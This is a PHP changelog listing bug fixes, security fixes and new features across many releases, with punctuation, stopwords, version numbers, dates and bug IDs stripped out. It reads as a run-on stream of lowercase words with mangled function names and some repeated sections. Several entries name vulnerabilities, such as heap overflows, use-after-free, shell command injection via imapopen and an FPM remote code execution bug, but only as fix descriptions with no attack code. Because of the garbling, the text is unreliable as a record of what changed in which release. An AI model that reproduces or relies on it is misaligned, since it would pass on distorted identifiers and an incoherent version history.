fetchcolumn error phar fixed bug heap buffer overflow phardetectpharfnameext soap fixed bug segfault using soapclient null option socket fixed bug unsupported constant macos sodium fixed bug sodiumexception segfaults php spl fixed bug splautoload cause segfault fixed bug classuses cause segfault fixed bug issue rebinding xmlrpc fixed bug heap bound read xmlrpcdecode fixed bug global bound read xmlrpc code version dec core improved php gc redesigned old extskel program written php run php extskelphp option mean dependency thus making work window box removed support beos add phpversion phpinfo title add netgetinterfaces implemented flexible heredoc nowdoc syntax per rfc http wikiphpnetrfcflexibleheredocnowdocsyntaxes added support reference list array destructuring per rfc http wikiphpnetrfclistreferenceassignment improved effectiveness zendsecurezero netbsd system without native similar feature added syslogfacility syslogident ini entry customizing syslog logging fixed bug memory leak zendregisterfunctions zts mode fixed bug support append mode tempmemory stream fixed bug uncaught exception formatted properly errorlog set syslog fixed bug segfault calling iscallable parent fixed bug broken link unused config item distributed ini file fixed bug composed class fatal error duplicate equal const property fixed bug identical trait method raise error composition fixed bug clang ignores fastcall calling convention variadic function fixed bug remove inconsitency internal exception user defined exception fixed bug mathematical operation convert object integer fixed bug internal class cast handler us integer instead float fixed bug fatal error instead error exception base class found fixed bug wording iterable scalar type fixed bug configguessconfigsub recognize riscv fixed bug segfault zendobjectsstoreput fixed bug ftruncate fails file fixed bug inherited static property desynchronized parent ref fixed bug changed behaviour unclosed heredoc fixed bug constant numeric string become integer used arrayaccess offset fixed bug nullary function nt check number argument fixed bug error relocating sapicliphp unsupported relocation type declaration use caseinsensitive constant deprecated added syslogfilter ini entry syslog filtering fixed bug segfault divideassign op get set fixed bug rarely honoured cristian rodríguez fixed broken zendreadstaticproperty laruence fixed bug trait used parent ignored child class fixed bug asm operand impossible constraint zendoperatorsh fixed bug crash zendcoalescespectmphandler assertion getzvalptrtmp failed fixed bug zcopyable invalid definition fixed bug fileexists stopped working phar fixed bug incorrect bypassing protected method accessibilty check fixed bug undefined class used class constant constexpr generates fatal error fixed bug fileputcontents block directory file dir fixed bug define error message mention resource valid value fixed bug undefined symbol cpuidcount fixed bug undefined symbol zendstringequalval c build fixed bug segfault using convertquotedprintableencode filter bcmath implemented fr way get current scale use fixed bug bcmath bcmul ignores scale parameter fixed bug splitbcnum pointless fixed bug bcmath errorswarnings bypass php error handling cli fixed bug output stdoutstderr closed cause immediate exit status fixed bug phpwinexe corrupts unicode symbol cli parameter curl expose curl constant curl fixed bug fixed finding curl system multiarch support date implemented fr add datetime createfromimmutable method fixed bug dateinterval microsecond property always fixed bug calling vardump datetimezone object modifies fixed bug mismatch arginfo datecreate updated timelib address several bug fixed bug datetime createfromformat accept v format specifier fixed bug wrap around behaviour microsecond working fixed bug datetime diff give wrong diff actual diff le second dba fixed bug compiler warning emitted dom fixed bug domdocument formatoutput attribute sometimes ignored fileinfo fixed bug slowness regression compared filter added addslashes sanitization mode filtersanitizeaddslashes fpm added fpmgetstatus function fixed bug getallheaders missing phpfpm fixed bug long message stdoutstderr truncated incorrectly added new log related fpm configuration option loglimit logbuffering decorateworkersoutput ftp fixed bug ftpclose sslread shutdown gd added support webp imagecreatefromstring gmp export internal structure accessor helper gmp object added gmpbinomial n k added gmplcm b added gmpperfectpower added gmpkronecker b iconv fixed bug iconvmimeencode fails qencode string fixed bug fixing ignored iconvmimedecodecontinueonerror imap fixed bug imapopen allows run arbitrary shell command via mailbox parameter fixed bug null pointer dereference imapmail interbase fixed bug incorrect reflection ibase p connect fixed bug phpphpinterbasedll crash moduleshutdown intl fixed bug uconverter setdestinationencoding change source instead destination fixed bug incorrect validation domain function json added jsonthrowonerror flag ldap added ldapexoprefresh helper exop refresh operation dd overlay added full support sending parsing ldap control fixed bug fix ldap path lookup distros fixed bug use pkgconfig available litespeed fixed bug binary directory nt get created building litespeed sapi fixed bug missing program prefix suffix mbstring updated oniguruma fixed bug mb title case conversionfirst word quotation nt capitalized fixed bug mbcasetitle misbehaves curled apostrophequote fixed bug crash zifmbsendmail fixed bug mbstring function version slow compared window fixed bug mbstrtolower invalid cause segmentation fault fixed bug use undeclared identifier intmax longmax fixed bug bus error due unaligned access zendinic onupdatelong fixed bug mbstringhttpoutputconvmimetypes ignored fixed bug broken conversion fixed bug mbstrpos throw unknown encoding conversion error fixed bug mbcheckencoding crash argument given empty array mysqlnd fixed bug prepared statement formatter truncates fractional second datetime column odbc removed support odbcrouter removed support birdstep fixed bug odbcfetchobject incorrect type signature opcache fixed bug loop variable confusion fixed bug var array key type value type fixed bug zendstringdestroy assertion zvalgcflags str gc fixed bug opcache enabled trigger falsepositive illegal string offset fixed bug type inference opcache cause side effect fixed bug arraydiffkey segmentation fault openssl added opensslpkeyderive function add minprotoversion maxprotoversion ssl stream option well related constant possible tl protocol value pcre implemented http upgrade fixed bug pregquote quote control character fixed bug w longer includes unicode character fixed bug regression pregmatch make fail pregjitstacklimiterror fixed bug pregmatch difference pdodblib implemented fr allow rowsets skipped automatically expose tds version pdo dblibattrtdsversion attribute pdo instance treat column like datetime fixed bug allow localesconf drive datetime format pdofirebird fixed bug pdofirebird return null result boolean firebird pdooci fixed bug pdopco phpfpm oci environment initialized phpfpm set pdo sqlite add support additional open flag pgsql added new error constant pgresulterror pgsqldiagschemaname pgsqldiagtablename pgsqldiagcolumnname pgsqldiagdatatypename pgsqldiagconstraintname pgsqldiagseveritynonlocalized fixed bug pgconvert broken regex time without timezone data type phar fixed bug includepath char limit case fixed bug deal leading slash adding file correctly fixed bug phardata always creates new file mode fixed bug heap buffer overflow read pharparsepharfile readline added completionappendcharacter completionsuppressappend option readlineinfo linked libreadline session fixed bug session fails start header sent simplexml fixed bug simplexml cast integer wrong fixed bug assignment empty string creates extraneous text node socket fixed bug validate length socketwrite soap fixed bug wrong reflection soapclient setsoapheaders fixed bug soapclient generates eerror even used fixed bug soapclient ca nt handle object reference correctly fixed bug wsdlcachememory cause segmentation fault fixed bug signedness issue soap spl fixed bug appending appenditerator lead segfault fixed bug incorrect behavior appenditerator append foreach loop fixed bug autoloading file syntax error us next autoloader may hide parse error fixed bug recursivetreeiterator setpostfix wrong signature fixed bug strange behavior appenditerator fixed bug mismatch arginfo splarray constructor updated bundled libsqlite standard added iscountable function added support samesite cookie directive including alternative signature setcookie setrawcookie sessionsetcookieparams remove superfluous warning inetntop inetpton fixed bug dnscaa record result contain garbage fixed unserialize disable creation unsupported data structure manually crafted string fixed bug accept efault addition enosys indicator getrandom missing fixed bug fopen accept null context fixed bug pathdomain sanitized setcookie fixed bug incorrect url header mtrand added hrtime function get high resolution time fixed bug stdclass setstate defined although varexport us fixed bug streamsocketgetname enclose bracket fixed bug disallow excessive parameter option array fixed bug segmentation fault caused property corruption fixed bug setcookie accept double type expire time fixed bug improve array failure message exposing passed instead array fixed bug ftruncate change file pointer fixed bug memory corruption segfault fixed bug ftruncate change seek pointer c mode testing implemented fr make runtestsphp support cgi section tidy support using tidyp instead tidy fixed bug tidy incorrect reflectionfunction param count function taking tidy fixed arginfo tidy construct tokenizer fixed bug tokengetall tokenparse flag fails recognise close tag fixed bug change remaining uncatchable fatal error parsing parseerror fixed bug tokengetall tokenparse flag fails recognise close tag newline fixed bug incorrect tokenization multiple invalid flexible heredoc string xml fixed bug external entity processing never fails zlib added zliblevel context option compresszlib wrapper version aug core fixed bug getimagesize function silently truncates null byte cmb phar fixed bug use freed hash key pharparsezipfile function version jul window rebuild official window binary patched libcurl php source change version may core fixed bug long filename cause oom temp file cleaned fixed bug long variable multipartformdata cause oom temp file cleaned version apr standard fixed bug sigsegv closing stream handle stream filter appended fixed bug shellexec silently truncates null byte fixed bug oob read urldecode version mar core fixed bug getheaders silently truncates null byte cmb exif fixed bug useofuninitializedvalue exif nikita version feb dom fixed bug write access violation domimplementation phar fixed bug file added tar phar buildfromiterator allaccess permission session fixed bug null pointer dereference php session upload progress version jan mbstring fixed bug global bufferoverflow session fixed bug heap useafterfree sessioncreateid standard fixed bug oob read phpstriptagsex version dec bcmath fixed bug buffer underflow bcshiftaddsub core fixed bug link silently truncates null byte window fixed bug directoryiterator class silently truncates null byte exif fixed bug useafterfree exif parsing memory sanitizer fixed bug heapbufferoverflow read exif gd fixed bug gd build broken signedcompareslow intl fixed bug segmentation fault locale filtermatches opcache fixed x bool x opcache emit undeclared variable notice standard fixed bug arraysearch globals fixed bug integer overflow pack cause outofbound access fixed bug striptags allows tag name whitelist bypass version nov core fixed bug parse error classified highest loglevel fixed bug segfault gc triggered generator stack frame destroyed fixed bug closure fromcallable nt handle closure invoke com fixed bug appending variant array cause segfault date fixed bug dateinterval incorrectly unserialized fixed bug serialising dateperiod convert datetimeimmutable iconv fixed bug wrong libiconv version displayed gedas martynas cmb opcache fixed bug incorrectly computed opcache checksum file nonascii character fixed bug opcache corrupts custom extension result openssl fixed bug tl issue http request affecting encrypted connection reflection fixed bug reflectionclass implementsinterface inaccurate error message trait socket fixed bug multicasting may leak memory version oct core fixed bug autodetectlineendings value parsed bool fixed bug memory error exif fixed bug illegal component exifreaddata since kalle fpm fixed bug envpathinfo underflow fpmmainc lead rce mbstring fixed bug mbdecodenumericentity args number inconsistency fixed bug mbcheckencoding longer support stringable object mysqli fixed bug ssl setting nt respected persistent connection used pdomysql fixed bug regression caused sp call yield additional empty result set session fixed bug sessiongc return value user defined session handler standard fixed bug filegetcontents wait twice specified timeout fixed bug strtr leak memory integer key used subject string shorter fixed bug streamgetline skip data used datagenerating filter zip fixed bug addglob modify given removepath value version sep core fixed bug ca nt access onedrive folder fixed bug generator incorrectly report nonreleasable gc child fastcgi fixed bug fastcgi onaccept hook called using named pipe window mysqlnd fixed connectattr issue added serverhost connection attribute odbc fixed bug odbcclose close arbitrary resource pdomysql fixed bug sp call yield additional empty result set sodium fixed bug partially uninitialized buffer returned sodiumcryptogenerichashinit spl fixed bug splobject iscloneable return true errs clone version aug core fixed bug buffer overflow zendparse fixed bug cast object confuses gc cause crash curl fixed bug bad curl resource returned curlmultiinforead exif fixed bug exif crash bus error due wrong alignment invalid cast iconv fixed bug bus error configure test iconv ignore litespeed updated litespeed sapi fixed clean shutdown mysqlnd fixed bug mariadb server version incorrectly detected opcache fixed bug assertion failure dceliveranges silencing used standard fixed bug bus error streamcopytostream file ssl stream invalid length fixed bug atime mtime mismatch fixed bug improper memory deallocation streamgetcontents fixed length buffer version aug date fixed bug discrepency time microtime exif fixed bug heapbufferoverflow exifprocessusercomment fixed bug heapbufferoverflow exifscanthumbnail fileinfo fixed bug finfofile show wrong mimetype tga file ftp fixed bug ftp ssl memory leak libxml fixed bug libxmldisableentityloader setting shared request cgifcgi litespeed updated litespeed sapi increased response header count limit added crash handler cleanly shutdown php request added cloudlinux modlsapi mode fixed bug post data ca nt buffered using php input make huge tmp file openssl fixed bug segmentation fault upon streamsocketaccept exported sockettostream opcache fixed bug file cache strip last character uname hash fixed bug opcache stats cache hit capped num fixed bug opcachegetconfiguration nt list directive phar fixed bug potential uaf phar rshutdown phpdbg fixed bug include unexistent file memory leak pdosqlite fixed bug segfault reuse statement schema changed sqlite upgraded sqlite standard fixed bug touch handle date php fixed bug passwordhash us weak option xmlrpc fixed bug xmlrpc mutates immutable object encoding version jul core fixed bug interface get skipped autoloader throw exception dom fixed bug segfault accessing property domdocumenttype mysqli fixed bug mysqliallowlocalinfile use meaningful error message fixed bug bindparam incorrect processing bool type opcache fixed bug path resolution fails opcache disabled request openssl fixed bug opensslencryptccmphpt fails openssl socket fixed bug socketselect fails resource array contains reference standard fixed bug extract extrskip skip fixed bug pregmatch failed zip fixed bug ziph found version may date fixed bug dateperiod construct invalid recurrence count value exif fixed bug heapbufferoverflow fpm fixed bug phpfpm kill working fixed bug staticphpnet nt work anymore gd fixed bug imageantialias image false work fixed bug uninitialized read gdimagecreatefromxbm iconv fixed bug outofbounds read iconvc phpiconvmimedecode due integer overflow json fixed bug use free json serializer opcache fixed possible crash inconsistent pcre cache opcache shm reset pdomysql fixed bug wrong meta pdotype bigint reflection fixed bug inconsistent reflection closure invoke session fixed bug wrong warning sessionsidbitspercharacter spl fixed bug splfileobject tostring may return array sqlite fixed bug bypassing openbasedir restriction via file uris version may cli fixed bug incorrect date header format builtin server exif fixed bug heapbufferoverflow estrndup via exifprocessifdtag interbase fixed bug impossibility creating multiple connection interbase php intl fixed bug intldateformatter create fails strict mode locale null litespeed litespeed sapi better process management new api function litespeedfinishrequest mail fixed bug potential heap corruption tsendmail pcre fixed bug pregmatch ignore r regex flag pdo fixed bug disable cloning pdo handleconnection object phpdbg fixed bug many open file fixed bug phpdbg segfaults listing conditional breakpoints fixed bug phpdbg build fails readline shared reflection fixed bug reflectionclass getmethods null nt work fixed bug different behavior always call destructor standard fixed bug recursive mkdir ftp stream wrapper incorrect fixed bug crash due null pointer parseinistring iniscannertyped fixed bug inconsistent substrcompare behaviour empty haystack version apr core fixed bug nullptr deref zendcompileexpr fixed bug segmentation fault break fixed bug anonymous class lose interface information fixed bug unable run test building shared extension aix bcmath fixed bug bcpow implementation related gcc compiler optimization com fixed bug crash php unload date fixed bug dateinterval createdatefromstring silently fails fixed bug added dateperiod getrecurrences method exif fixed bug heapbufferoverflow fixed bug heapbufferoverflow exifiifaddvalue fpm fixed bug fpm fails build aix due missing wcoredump gd fixed bug writing truecolor image gif ignores interlace flag mysqli fixed bug mysqlifetchfield hang script opcache fixed bug opcache pass wrong value inline array push assignment fixed bug incorrect pi node insertion jmpznz identical successor phpdbg fixed bug phpdbg break cmd alias listed help match actual alias sodium fixed bug signdetached string terminated added ini directive standard fixed bug segmentation fault using undefined constant custom wrapper fixed bug crash extract overwriting extracted array fixed bug varexport create parsable value phpintmin fixed bug ftp stream wrapper set directory executable version mar core fixed bug core dump using parseinistring numeric section fixed bug rename across device may allow unwanted access processing com fixed bug already defined constant properly reported exif fixed bug uninitialized read exifprocessifdintiff fixed bug invalid read exifprocesssofn fixed bug uninitialized read exifprocessifdinmakernote fixed bug uninitialized read exifprocessifdinmakernote pdooci support oracle database tracing attribute action module clientinfo clientidentifier phar fixed bug null pointer dereference pharcreateorparsefilename spl fixed bug directoryiterator glob nt support current path relative query fixed bug openfile silently truncates null byte standard fixed bug unintialized phpstreamstatbuf stat function mysql disabled local infile default enabled using phpini directive mysqliallowlocalinfile mysqli pdo mysqlattrlocalinfile attribute pdomysql version feb core fixed bug callstatic may get incorrect argument fixed bug disabling class cause segfault member access fixed bug php crash parsing class curl fixed bug segfault server push gd fixed bug imagescale imgbilinearfixed cause black border fixed bug gdimagefilledarc nt properly draw pie fixed bug imagescale may return image resource failure fixed bug bmps may fail loaded fixed bug imagewbmp segfaults large image ldap fixed bug ldapbind using ldaps ldapstarttls exception mbstring fixed bug mbscrub silently truncates null byte mysqlnd fixed bug mysqlndextpluginh plugin method family external visibility opcache fixed bug configure fails aix opcache enabled openssl fixed bug feof might hang tl stream case fragmented tl record pdo fixed bug arraywalkrecursive corrupts value type leading pdo failure socket fixed bug socketrecvfrom may return invalid address macos standard fixed bug segfault arraymultisort fixed bug parsestr segfaults inserting item existing array version jan core fixed bug memcpy negative length via crafted dns response fixed bug zendsignalstartup need zendapi fixed bug php generates fefree opcode wrong line com fixed bug serializing unserializing com object crash date fixed bug datetime diff give wrong diff actual diff le second exif fixed bug unsigned rational number written signed rational gd fixed bug efree uninitialized heap data imagescale lead useafterfree fixed bug imagecolormatch bound write heap fixed bug incorrect error handling imagecreatefromjpeg fixed bug auto cropping insufficient precision fixed bug imagecropauto gdcropsides crop left right imap fixed bug null pointer dereference imapmail mbstring fixed bug buffer overflow mb regex function fetchtoken fixed bug heap buffer overflow mb regex function compilestringnode fixed bug heap buffer overflow multibyte matchat fixed bug heap buffer overflow due incorrect length expandcasefoldstring fixed bug buffer overflow fetchtoken fixed bug buffer overflow multibyte case folding unicode fixed bug heap overflow fixed bug ocipconnect ocicredext working added ocisetcalltimeout call timeouts added ocisetdboperation dbop endtoendtracing attribute opcache fixed bug cfg assertion failure multiple finalizing switch free one block pdo handle invalid index passed pdostatement fetchcolumn error phar fixed bug heap buffer overflow phardetectpharfnameext socket fixed bug unsupported constant macos fixed bug issue rebinding xmlrpc fixed bug heap bound read xmlrpcdecode fixed bug global bound read xmlrpc code version dec ftp fixed bug ftpclose sslread shutdown cli fixed bug phpwinexe corrupts unicode symbol cli parameter fileinfo fixed bug slowness regression compared iconv fixed bug fixing ignored iconvmimedecodecontinueonerror core fixed bug segfault using convertquotedprintableencode filter imap fixed bug imapopen allows run arbitrary shell command via mailbox parameter odbc fixed bug odbcfetchobject incorrect type signature opcache fixed bug type inference opcache cause side effect fixed bug arraydiffkey segmentation fault phar fixed bug phardata always creates new file mode fixed bug heap buffer overflow read pharparsepharfile pgsql fixed bug pgconvert broken regex time without timezone data type soap fixed bug soapclient ca nt handle object reference correctly fixed bug wsdlcachememory cause segmentation fault fixed bug signedness issue soap socket fixed bug validate length socketwrite version nov core fixed bug segfault shutdown function memory limit error fixed bug cyclic reference generator detected fixed bug phpize configure create redundant deps file fixed bug buildconf output error message stderr mizunashi mana date upgraded timelib fixed bug year component overflow date format c r fixed bug fraction diff correctly normalized fcgi fixed bug failed shutdownreboot end session window fixed bug apacheresponseheaders remove last character header name ftp fixed bug data truncation due forceful ssl socket shutdown intl fixed bug uargumenttypemismatch reflection fixed bug object access private attribute handling reflection error fixed bug reflectionfunction invoke invoke closure object scope sodium output truncated case block size byte supposed sodiumpad even old version libsodium installed fixed bug sodiumpad could read return write uninitialized memory trying pad empty input standard fixed bug iniscannerraw nt strip trailing whitespace tidy fixed bug tidy getoptdoc available window xml fixed bug xmlparseintostruct resolve entity add support getting skiptagstart skipwhite option xmlrpc fixed bug xmlrpcencoderequest crash version oct core fixed bug foreach inconsistent array modified loop fixed bug methodexists spl iterator passthrough method corrupts memory curl fixed bug use curlmultiwait timeouts respected iconv fixed bug iconvmimeencode qencoding longer opcache fixed bug zendopcachememorybase periodically deleted o fixed bug compiletime evaluation disabled function opcache cause segfault posix fixed bug posixgetgrnam fails print detail group reflection fixed bug wrong exception thrown using reflectionmethod standard fixed bug wrong error message fopen ftp wrapped fails open data connection fixed bug bindto work filegetcontents fails streamsocketclient fixed bug arrayreduce slow carry large array xmlrpc fixed bug ca nt build xmlrpc expat zlib fixed bug phpzlibinflatefilter may update bytesconsumed version sep core fixed bug parent private constant extends class memory leak fixed bug generate enabled extension fixed bug memory leak using classalias nondebug mode fixed bug x due header transferencoding chunked fixed arginfo bzcompress gettext fixed bug incorrect restoring ldflags iconv fixed bug iconvmimedecode return extra character header fixed bug iconvmimedecodeheaders function skipping header fixed bug iconvmimedecode ignore special character fixed bug iconvmimedecodeheaders skip header intl fixed bug messageformatter formatmessage memory corruption named placeholder libxml fixed bug public id parameter libxmlsetexternalentityloader callback undefined mbstring fixed bug mbdetectorder return value varies based argument type opcache fixed bug opcache treat path containing testpharmatld phar file openssl fixed bug unusable ssl peerfingerprint streamcontextcreate phpdbg fixed bug phpdbg man page contains outdated information spl fixed bug exception directoryiterator getlinktarget fixed bug regexiterator pregflags null instead standard fixed bug arrayreduce leak memory callback throw exception zlib fixed bug zlib version check fails includezlib style dir passed withzlib configure option fixed bug minimal required zlib library version aug calendar fixed bug jewishc compile error window gbk charset filter fixed bug reference subarray filtering break filter pdofirebird fixed bug memory leak fetching blob field pdopgsql fixed bug possible memory leak using pdo cursorscroll option fixed bug bindvalue nt juggle standard fixed bug incorrect entry gethtmltranslationtable fixed bug arraycolumn null value indexkey become incrementing key result fixed bug segmentation fault using outputaddrewritevar zip fixed bug ziparchive memory leak overwrite flag empty archive version jul core fixed bug php hang illegal string offset string reference error handler fixed bug object creation leak memory executed http fixed bug chain mixed exception error serialize properly date fixed bug undefined property dateinterval f exif fixed bug heap use free phpstreamfree fixed bug int overflow lead heap overflow exifthumbnailextract exifc fixed bug heapbufferoverflow read size reading exif data fpm fixed bug vulnerability phpfpm changing stdin nonblocking gmp fixed bug integer underflow unserializing gmp possible class intl fixed bug getdebuginfo handler breakiterator show wrong type mbstring fixed bug integer overflow excessive memory usage mbstrimwidth opcache fixed bug opcache cause empty return value pgsql fixed bug pgfetchresult fetch next row phpdbg fix arginfo wrt optionalrequired parameter reflection fixed bug php crash core dump throwing exception error handler fixed bug reflectionproperty getvalue incorrectly work inherited class standard fixed bug arraymergerecursive duplicating subarray key fixed bug getimagesize imageinfo return false fixed bug window linkinfo lack openbasedir check zip fixed bug opsyszcpm defined instead opsyscpm version jun core fixed bug segfault opcache enabled extension use zendregisterclassalias cli server fixed bug php builtin server find file root path contains special character openssl fixed bug opensslpkeygetpublic respect openbasedir fixed bug openssl extension fails build libressl spl fixed bug norewinditerator segfault standard fixed bug sigv zendmmallocsmall fixed bug link bad file descriptor nonascii path version may exif fixed bug exifreaddata zendmmheap corrupted fpm fixed bug withfpmacl wrongly try find libacl freebsd intl fixed bug locale parselocale broken argument opcache fixed bug phpfpm sporadic crash running infinitewp fixed bug assertion failure file cache unserializing empty trycatcharray fixed bug opcache cause incorrect undefined variable error reflection fixed arginfo arrayreplace recursive arraymerge recursive session fixed bug url rewriting transsid working url start version apr core fixed bug convert valgrind detection configure option date fixed bug mismatch arginfo datecreate exif fixed bug heap buffer overflow read exifiifaddvalue fpm fixed bug error failed reload execvp failed argument list long fixed incorrect write getenv result fpm reload gd fixed bug imagedashedline dashed line sometimes visible iconv fixed bug stream filter converticonv lead infinite loop invalid sequence intl fixed bug intl compilation fails ldap fixed bug malicious ldapserver response cause crash mbstring fixed bug wrong detection fixed bug mbstring build oniguruma odbc fixed bug odbc function available default window opcache fixed bug access violation using opcache phar fixed bug fix may complete phpdbg fixed bug memory corruption arbitrary nul overwrite spl fixed bug mismatch arginfo splarray constructor standard fixed bug mailaddxheader default inconsistent doc fixed bug incorrect url header mtrand version mar core fixed bug segfault throwing exception errorhandler fixed bug date illegal option configure freebsd fpm fixed bug dumpable fpm child process allow bypassing opcache access control ftp gd fixed bug signed integer conversion imagescale fixed bug null pointer access crashed php fixed imagesetinterpolation arginfo iconv fixed bug freeing uninitialized pointer mbstring fixed bug wrong unicode mapping charsets opcache fixed bug assertion failure live range dce due block pas misoptimization openssl fixed openssl arginfos pcntl fixed bug pcntlwexitstatus return incorrect bigendian platform phar fixed bug segmentation fault buildfromiterator directory name contains n standard fixed bug strange reference behavior fixed arginfos fixed bug parseinistring fails parse foo baz segfault version mar core fixed bug streamisatty return wrong value fixed bug simple way segfaults threadsafe php configuration date fixed bug timezone get truncated formatted fixed bug argument datetimezone listidentifiers accept null fixed bug calling vardump datetimezone object modifies ldap fixed bug fix ldap path lookup distros fixed bug use pkgconfig available pgsql fixed bug memory leak pgescapebytea phar fixed bug phar extractto accept specific directory extracted fixed bug deal leading slash adding file correctly fixed bug deal leading slash adding file correctly odbc fixed bug unable retrieve value varchar max type opcache fixed bug opcache segfault installing bitrix fixed bug filegetcontents httpresponseheader variable bugged opcache fixed bug modulus value stored variable spl fixed bug strange behavior appenditerator standard fixed bug dnscaa record result contain garbage fixed bug stackbufferoverflow parsing http response version feb core fixed bug potential memleak internal class static member fixed bug path character problem fixed bug nonportable shell script fixed bug segfault using spread operator generator passed reference fixed bug arg getdefinedfunctions optional fixed bug exit inside generator finally result fatal error fcgi fixed bug getenv crash window second parameter false imap fixed bug imapappend heapcorruction opcache fixed bug file cache populated shm run full fixed bug var tmp array key type value type fixed bug using crash fixed bug interned string buffer overflow may cause crash pdo fixed bug pdo extension nt allow built shared darwin pdo mysql fixed bug pdo mysql module ca nt built module pgsql fixed bug pgversion crash called connection cockroach readline fixed bug readlinereadhistory segfaults empty file sapi fixed bug embed sapi segmentation fault sapiregisterpostentry soap fixed bug soapclient generates eerror even used fixed bug segmentation fault zendstringrelease spl fixed bug recursivearrayiterator traverse array reference fixed bug recursivearrayiterator nt constant parent class fixed bug recursivearrayiterator iterate object property standard fixed bug substrcount incorrect result fixed bug arrayvalues nt work empty array zip display header buildtime library runtime version phpinfo libzip version jan core fixed bug segmentation fault fixed bug php seems incompatible onedrive file demand fixed bug access violation fixed bug unable clone instance private clone defined fixed bug phpprocess crash isfile used string longer char cli server fixed bug directory exist fpm fixed bug libxmldisableentityloader setting shared request gd fixed bug potential infinite loop gdimagecreatefromgifctx opcache fixed bug narrowing occurred type inference error fixed bug interned string buffer overflow may cause crash fixed bug narrowing occurred type inference error fixed bug invalid opcode pcre fixed bug preglasterror returning error code error phar fixed bug reflected x phar page standard fixed bug fread free unused buffer fixed bug mtrand return value outside min max remi fixed bug inappropriately parsing http response lead php segment fault fixed bug accept efault addition enosys indicator getrandom missing fixed bug phpiniscannedfiles reporting correctly fixed bug putenv work properly parameter contains nonascii unicode character zip fixed bug segfault libzip version nov bcmath fixed bug bcmod truncates fractionals cli fixed bug process started interactive shell phpstorm fixed bug interactive shell opening instead script execution f flag cli server fixed bug random invalid request unexpected eof using router script core added zendcount zendgetclass zendgetcalledclass zendgettype zendfuncnumargs zendfuncgetargs instruction implement corresponding builtin function countable interface moved spl core added zendinarray instruction implementing optimized inarray builtin function hash lookup flipped array removed istypeimmutable copyable refcounted removed sqlsafemode directive removed support netware renamed reflectionclass isiterateable reflectionclass isiterable alias original name bc fixed bug wsa cleanup executes mshutdown implemented fr disallow mail header injection extra header yasuo implemented fr procnice window fix pthreads detection crosscompiling ffontaine fixed memory leak caused exception thrown destructors bob dmitry fixed bug uniqid use better random source implemented fr add enablevirtualterminalprocessing flag phpexe implemented convert numeric key objectarray cast rfc fix bug etc implemented deprecate remove bareword unquoted string rfc raised minimum supported window version window implemented minor optimization arraykeysarrayvalues added phposfamily constant determine o fixed bug method compatibility check look original definition parent fixed bug jsonobjectasarray respected fixed bug corrupted class entry shutdown destructor spawn another object fixed bug filename got limited maxpath scan directory fixed bug bug bug bug others related interned string handling t build implemented trailing comma list syntax rfc group use list fixed bug possible override trait property different looselyequal value fixed bug restraining construct access level subclass give fatal error fixed bug override abstract method abstract method fixed bug trait enforce different inheritance rule fixed misparsing abstract unix domain socket name change phposfamily value osx darwin allow loading phpzend extension name ini file extension name added object type annotation fixed bug crash combination ini entry startup fixed bug isset zeroprefixed numeric index array broken added new vm instuctions issetisemptycv unsetcv previously implemented issetisemptyvar unsetvar variant zendquickset flag fixed bug unserialize nt handle change property visibility fixed bug extensiondir ext use current directory base implemented fr improved error message fetching property nonobject fixed bug buildchecksh check autoconf version need updated fixed bug data race zts build fixed bug streamcopytostream nt stream anymore curl fixed bug openssl support detected better fix use pkgconfig instead curlconfig date fixed bug impossible prototype datetime createfromformat implemented fr adding datetime constant datetimeinterface interface fixed bug outofbounds read timelibmeridian fixed bug redefinition typedefs ttinfo fixed bug dateinterval microsecond property always dba fixed bug flatfile dbafetch fails read replaced entry dom implemented fr implement countable domnodelist domnamednodemap exif added support vendor specific tag following format samsung dji panasonic sony pentax minolta sigmafoveon agfa kyocera ricoh epson fixed bug exifreaddata fails read data image fixed bug type confusion exifreaddata leading heap overflow debug mode fixed bug exif header component value check error fixed bug corrupt exif header maximum directory nesting level reached camera fixed redhat bug php returning full result exifreaddata function implemented fr exifreaddatathumbnail add support stream resource deprecated readexifdata alias fixed bug exifreaddata illegal ifd size warning occurs correct exif format fixed bug exif thumbnail read anymore fixed bug php crash segfault exifreaddata called fixed bug exifreaddata illegal ifd offset work fine exif reader fileinfo upgrade bundled libmagic fpm configuration limit fpm slow log trace caller fixed bug phpvalue act like phpadminvalue ftp implement mlsd structured listing directory added ftpappend function gd implemented imageresolution getter setter christoph fixed bug gdh stdargh include missing valist use gderrormethod fixed bug memory disclosure do via crafted bmp image gmp fixed bug gmpfact silently ignores noninteger input hash changed hashcontext resource object disallowed usage noncryptographic hash function hmac fixed bug supported bigendian machine imap fixed bug imapmailboxmsginfo return wrong size intl fixed bug test using spoofchecker may unavailable fixed bug regression intldateformatter parse change position argument json add option jsonencode jsondecode ignore replace invalid byte sequence address request fixed bug buffer overflow jsondecode jsoninvalid fixed bug jsonpartialoutputonerror result json null key ldap implemented fr support ldap exop operation fixed support ldapoptservercontrols ldapoptclientcontrols ldapgetoption fixed passing empty array ldapsetoption client server control mbstring implemented fr mbchr mbord implemented fr mbscrub implemented fr enhancement mbconvertencoding handle multibyte replacement char nicely added array input support mbconvertencoding added array input support mbcheckencoding fixed bug enhancement mbsubstitutecharacter update oniguruma version fixed bug mbstrtolower fails titlecase character mcrypt deprecated mcrypt extension moved pecl opcache added global optimisation pass based data flow analysis using single static assignment ssa form sparse conditional constant propagation sccp dead code elimination dce removal unused local variable nikita dmitry fixed incorect constant conditional jump elimination fixed bug invalid opcode using opcache fixed bug assertion fails extended info generated fixed bug phi source removel fixed bug webserver hang valid php text fixed bug segfault loading wordpress wpadmin openssl use tlsany default ssl tl negotiation fix leak opensslspkinew added parameter add ssl securitylevel stream option support openssl security level jakub zelenka allow setting sni cert private key separate file fixed bug us different eol automatically load openssl configuration file pcre added support pcre jit fast path api fixed bug inconsistent pcre capture match result fixed bug minor bc break pcrejit change output pregmatch fixed bug preggrep reporting first input string fixed bug pcre jit broken fixed bug broken build system libpcre nt jit support phar fixed bug phar correctly handle name containing dot pdo fixed bug emulated statement let value dictate parameter type add sent sql debug dump emulated prepares add parameter type national character set string pdodblib fixed bug bigint column returned string expose dblibrary version pdo dblibattrversion attribute pdo instance add test coverage bug pdooci fixed bug align withpdooci configure option syntax pdosqlite switch function rasmus phpdbg added extendedvalue opcode dump output session fixed bug prohibit session save handler recursion pr removed registerglobals related code used session key name improved bug fix user save handler set sessionsetsavehandler fixed bug session function incorrectly warn calling readonlygetter mode fixed bug sessioncacheexpirecachelimitersavepath trigger warning read mode fixed bug session fails start header sent sodium new cryptographic extension added missing binding libsodium spl fixed bug incorrect arginfo arrayiterator construct added splobjectid implement writing blob update sqlite standard fixed bug closing fd incorrect pt enabled fixed bug unserialize accepts two plusminus sign 